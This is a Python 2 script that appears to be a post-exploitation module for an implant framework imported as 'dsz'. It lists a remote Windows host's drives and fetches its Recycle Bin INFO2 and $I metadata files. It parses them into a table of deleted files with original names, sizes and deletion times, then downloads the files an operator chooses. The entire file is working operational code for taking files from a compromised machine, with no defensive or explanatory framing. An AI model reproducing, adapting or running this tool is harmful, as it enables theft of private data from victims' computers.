
from binascii import hexlify
import time
import socket
import sys
import os.path
import dsz, dsz.control, dsz.cmd, dsz.version
import ops.data
from ops.pprint import pprint

def parsevistafile(file, entry_list, vistaIfile, trash_list, trash_dirs):
    recyclepath = os.path.dirname(vistaIfile)
    logDir = dsz.lp.GetLogsDirectory()
    f = open(('%s\\GetFiles\\%s' % (logDir, file)), 'rb')
    out = f.read()
    length = len(out)
    current = 0
    length -= 16
    current += 16
    f.close()
    hexsize = hexlify(out[8:16])
    size2 = socket.ntohl(int(hexsize[0:8], 16))
    size1 = socket.ntohl(int(hexsize[8:16], 16))
    size = int(('%08x%08x' % (size1, size2)), 16)
    hextimestamp = hexlify(out[16:24])
    timestamp2 = socket.ntohl(int(hextimestamp[0:8], 16))
    timestamp1 = socket.ntohl(int(hextimestamp[8:16], 16))
    timestamp = int(('%08x%08x' % (timestamp1, timestamp2)), 16)
    if (timestamp > 0):
        timestamp /= 10000000
        timestamp -= 11644473600L
        timestamp = time.asctime(time.localtime(timestamp))
    unicode_filename = out[24:].replace('\x00\x00', '')
    try:
        unicode_filename = unicode_filename.decode('utf16')
    except:
        unicode_filename = hexlify(unicode_filename)
    originalfile = unicode_filename
    if (os.path.basename(vistaIfile.replace('$I', '$R')) in trash_dirs):
        trash_dir = vistaIfile.replace('$I', '$R')
        for item in trash_list:
            if item[0].startswith(os.path.abspath(trash_dir)):
                trash_file = item[0].replace(trash_dir, originalfile)
                entry_list.append({'index': (len(entry_list) + 1), 'disregard': out[current:(current + 4)], 'originalfile': trash_file, 'timestamp': timestamp, 'size': item[1], 'unicode_filename': unicode_filename, 'filename': item[0]})
    else:
        entry_list.append({'index': (len(entry_list) + 1), 'disregard': out[current:(current + 4)], 'originalfile': originalfile, 'timestamp': timestamp, 'size': size, 'unicode_filename': unicode_filename, 'filename': vistaIfile.replace('$I', '$R')})
    return entry_list

def parsefile(file, entry_list, info2file, trash_list, trash_dirs):
    recyclepath = os.path.dirname(info2file)
    logDir = dsz.lp.GetLogsDirectory()
    f = open(('%s\\GetFiles\\%s' % (logDir, file)), 'rb')
    out = f.read()
    length = len(out)
    current = 0
    length -= 16
    current += 16
    f.close()
    while (length > 799):
        originalfile = ('%s' % out[(current + 4):((current + 4) + 260)])
        originalfile = originalfile.replace('\x00', '')
        hextimestamp = hexlify(out[(current + 272):(current + 280)])
        timestamp2 = socket.ntohl(int(hextimestamp[0:8], 16))
        timestamp1 = socket.ntohl(int(hextimestamp[8:16], 16))
        timestamp = int(('%08x%08x' % (timestamp1, timestamp2)), 16)
        if (timestamp > 0):
            timestamp /= 10000000
            timestamp -= 11644473600L
            timestamp = time.asctime(time.localtime(timestamp))
        size = socket.ntohl(int(hexlify(out[(current + 280):(current + 284)]), 16))
        drivedesignator = socket.ntohl(int(hexlify(out[(current + 268):(current + 272)]), 16))
        recordnumber = socket.ntohl(int(hexlify(out[(current + 264):(current + 268)]), 16))
        drive = ('%c' % (97 + int(drivedesignator)))
        if (('D%s%s' % (drive, int(recordnumber))) in trash_dirs):
            filename = ('D%s%s' % (drive, int(recordnumber)))
            unicode_filename = out[(current + 284):(current + 800)].replace('\x00\x00', '')
            try:
                unicode_filename = unicode_filename.decode('utf16')
                filename = ('D%s%s' % (drive, int(recordnumber), os.path.basename(unicode_filename)))
            except:
                unicode_filename = hexlify(unicode_filename)
            trash_dir = os.path.join(recyclepath, filename)
            for item in trash_list:
                if item[0].startswith(trash_dir):
                    trash_file = item[0].replace(trash_dir, originalfile)
                    entry_list.append({'index': (len(entry_list) + 1), 'disregard': out[current:(current + 4)], 'originalfile': trash_file, 'recordnumber': recordnumber, 'drivedesignator': drivedesignator, 'timestamp': timestamp, 'size': item[1], 'unicode_filename': unicode_filename, 'drive': drive, 'filename': item[0]})
        else:
            filename = ('D%s%s.%s' % (drive, int(recordnumber), originalfile.split('.')[(-1)]))
            unicode_filename = out[(current + 284):(current + 800)].replace('\x00\x00', '')
            try:
                unicode_filename = unicode_filename.decode('utf16')
                filename = ('D%s%s.%s' % (drive, int(recordnumber), os.path.basename(unicode_filename).split('.')[(-1)]))
            except:
                unicode_filename = hexlify(unicode_filename)
            entry_list.append({'index': (len(entry_list) + 1), 'disregard': out[current:(current + 4)], 'originalfile': originalfile, 'recordnumber': recordnumber, 'drivedesignator': drivedesignator, 'timestamp': timestamp, 'size': size, 'unicode_filename': unicode_filename, 'drive': drive, 'filename': os.path.join(recyclepath, filename)})
        current += 800
        length -= 800
    return entry_list

def getlist(itemlist):
    want = ''
    want = dsz.ui.GetString('Please a list of indexes you would like (ex: "1,3,5-7,13"): ', want)
    wantlist = want.split(',')
    intlist = []
    for item in wantlist:
        if (len(item.split('-')) == 2):
            itemrange = item.split('-')
            for integer in range(int(itemrange[0]), (int(itemrange[1]) + 1)):
                try:
                    intlist.append(integer)
                except:
                    continue
        else:
            try:
                intlist.append(int(item))
            except:
                continue
    outlist = []
    for item in itemlist:
        if (item['index'] in intlist):
            outlist.append(item)
    return outlist

def getdrives():
    drive_list = []
    dsz.control.echo.Off()
    cmd = 'drives'
    (succ, drivescmdid) = dsz.cmd.RunEx(cmd, dsz.RUN_FLAG_RECORD)
    dsz.control.echo.On()
    try:
        drivesobject = ops.data.getDszObject(cmdid=drivescmdid, cmdname='drives')
    except:
        dsz.ui.Echo('There was an issue with the ops.data.getDszObject.', dsz.ERROR)
        return 0
    for drive in drivesobject.driveitem:
        if (drive.type == 'Fixed'):
            drive_list.append(drive.drive)
    return drive_list

def getinfo2list(drive_list):
    info2_list = []
    for drive in drive_list:
        dsz.control.echo.Off()
        cmd = ('dir -mask INFO2 -path %s -recursive -max 0' % os.path.join(drive, 'recycler'))
        (succ, dircmdid) = dsz.cmd.RunEx(cmd, dsz.RUN_FLAG_RECORD)
        dsz.control.echo.On()
        try:
            dirobject = ops.data.getDszObject(cmdid=dircmdid, cmdname='dir')
        except:
            dsz.ui.Echo('There was an issue with the ops.data.getDszObject.', dsz.ERROR)
            return 0
        for directory in dirobject.diritem:
            path = directory.path
            info2_list.append(('%s\\INFO2' % path))
    return info2_list

def getvistaIlist(drive_list):
    vistaI_list = []
    for drive in drive_list:
        dsz.control.echo.Off()
        cmd = ('dir -mask $I* -path %s -recursive -max 0' % os.path.join(drive, '$recycle.bin'))
        (succ, dircmdid) = dsz.cmd.RunEx(cmd, dsz.RUN_FLAG_RECORD)
        dsz.control.echo.On()
        try:
            dirobject = ops.data.getDszObject(cmdid=dircmdid, cmdname='dir')
        except:
            dsz.ui.Echo('There was an issue with the ops.data.getDszObject.', dsz.ERROR)
            return 0
        for directory in dirobject.diritem:
            path = directory.path
            for file in directory.fileitem:
                vistaI_list.append(os.path.join(path, file.name))
    return vistaI_list

def gettrashlist(info2_list):
    trash_list = []
    trash_dirs = []
    dirobject = None
    previousdir = None
    for info2 in info2_list:
        if (not (previousdir == os.path.dirname(info2))):
            previousdir = os.path.dirname(info2)
            dsz.control.echo.Off()
            cmd = ('dir -mask * -path %s -recursive -max 0' % os.path.dirname(info2))
            (succ, dircmdid) = dsz.cmd.RunEx(cmd, dsz.RUN_FLAG_RECORD)
            dsz.control.echo.On()
            try:
                dirobject = ops.data.getDszObject(cmdid=dircmdid, cmdname='dir')
            except:
                dsz.ui.Echo('There was an issue with the ops.data.getDszObject.', dsz.ERROR)
                return 0
        for directory in dirobject.diritem:
            path = directory.path
            if (os.path.abspath(path) == os.path.dirname(info2)):
                for file in directory.fileitem:
                    if ((not (file.name in ['.', '..'])) and (file.size == 0)):
                        trash_dirs.append(file.name)
                continue
            for file in directory.fileitem:
                if file.attributes.directory:
                    continue
                if (not (file.name in ['.', '..'])):
                    trash_list.append([os.path.join(path, file.name), file.size])
    trash_list.sort()
    trash_dirs.sort()
    prev_item = 0
    new_trash_list = []
    new_trash_dirs = []
    for item in trash_list:
        if (item == prev_item):
            continue
        prev_item = item
        new_trash_list.append(item)
    prev_item = 0
    for item in trash_dirs:
        if (item == prev_item):
            continue
        prev_item = item
        new_trash_dirs.append(item)
    return (new_trash_list, new_trash_dirs)

def getinfo2files(info2_list):
    info2_files = []
    for info2 in info2_list:
        cmd = ('get %s' % info2)
        dsz.control.echo.Off()
        (runsuccess, getid) = dsz.cmd.RunEx(cmd, dsz.RUN_FLAG_RECORD)
        dsz.control.echo.On()
        if (not runsuccess):
            dsz.ui.Echo(('Could not get %s. CMDID: %s' % (info2, getid)), dsz.ERROR)
            continue
        file = dsz.cmd.data.Get('filelocalname::localname', dsz.TYPE_STRING)[0]
        info2_files.append({'file': file, 'info2': info2})
    return info2_files

def getvistaIfiles(vistaI_list):
    vistaI_files = []
    for vistaI in vistaI_list:
        cmd = ('get %s' % vistaI)
        dsz.control.echo.Off()
        (runsuccess, getid) = dsz.cmd.RunEx(cmd, dsz.RUN_FLAG_RECORD)
        dsz.control.echo.On()
        if (not runsuccess):
            dsz.ui.Echo(('Could not get %s. CMDID: %s' % (vistaI, getid)), dsz.ERROR)
            continue
        file = dsz.cmd.data.Get('filelocalname::localname', dsz.TYPE_STRING)[0]
        vistaI_files.append({'file': file, 'vistaI': vistaI})
    return vistaI_files

def getfiles(list):
    for item in list:
        cmd = ('get "%s" -realpath "%s"' % (item['filename'], item['unicode_filename']))
        try:
            dsz.control.echo.Off()
            (runsuccess, getid) = dsz.cmd.RunEx(cmd, dsz.RUN_FLAG_RECORD)
            dsz.control.echo.On()
        except:
            dsz.ui.Echo(('Could not get %s with a -realpath (probably unicode issues, going to try without). CMDID: %s' % (item['filename'], getid)), dsz.ERROR)
            cmd = ('get "%s"' % item['filename'])
            dsz.control.echo.Off()
            (runsuccess, getid) = dsz.cmd.RunEx(cmd, dsz.RUN_FLAG_RECORD)
            dsz.control.echo.On()
        if (not runsuccess):
            try:
                dsz.ui.Echo(('Could not get %s (%s). CMDID: %s' % (item['filename'], os.path.basename(item['originalfile']), getid)), dsz.ERROR)
            except:
                dsz.ui.Echo(('Could not get %s. CMDID: %s' % (item['filename'], getid)), dsz.ERROR)
        else:
            try:
                dsz.ui.Echo(('Successfully got %s (%s). CMDID: %s' % (item['filename'], os.path.basename(item['originalfile']), getid)))
            except:
                dsz.ui.Echo(('Successfully got %s. CMDID: %s' % (item['filename'], getid)))

def main(args):
    if (len(args) > 1):
        dsz.ui.Echo('Pulls all INFO2 files on the system, parses them for a list of deleted files, and allows you to download chosen files.')
        return 0
    entry_list = []
    dsz.ui.Echo('Obtaining a list of drives', dsz.GOOD)
    drive_list = getdrives()
    if dsz.version.checks.windows.IsVistaOrGreater():
        dsz.ui.Echo('Diring a list of $I* files', dsz.GOOD)
        vistaI_list = getvistaIlist(drive_list)
        dsz.ui.Echo('Diring for a list of trash files', dsz.GOOD)
        (trash_list, trash_dirs) = gettrashlist(vistaI_list)
        dsz.ui.Echo('Getting all $I* files', dsz.GOOD)
        vistaI_files = getvistaIfiles(vistaI_list)
        for file in vistaI_files:
            entry_list = parsevistafile(file['file'], entry_list, file['vistaI'], trash_list, trash_dirs)
    else:
        dsz.ui.Echo('Diring a list of INFO2 files', dsz.GOOD)
        info2_list = getinfo2list(drive_list)
        dsz.ui.Echo('Diring for a list of trash files', dsz.GOOD)
        (trash_list, trash_dirs) = gettrashlist(info2_list)
        dsz.ui.Echo('Getting all INFO2 files', dsz.GOOD)
        info2_files = getinfo2files(info2_list)
        for file in info2_files:
            entry_list = parsefile(file['file'], entry_list, file['info2'], trash_list, trash_dirs)
    if (not entry_list):
        return True
    if dsz.version.checks.windows.IsVistaOrGreater():
        pprint(entry_list, ['Index', 'OriginalFile', 'TrashName', 'Size', 'DateDeleted', 'UnicodeFilename'], ['index', 'originalfile', 'filename', 'size', 'timestamp', 'unicode_filename'])
    else:
        pprint(entry_list, ['Index', 'OriginalFile', 'TrashName', 'Size', 'DateDeleted', 'UnicodeFilename'], ['index', 'originalfile', 'filename', 'size', 'timestamp', 'unicode_filename'])
    get_list = getlist(entry_list)
    getfiles(get_list)
    return True
if (__name__ == '__main__'):
    if (main(sys.argv) != True):
        sys.exit((-1))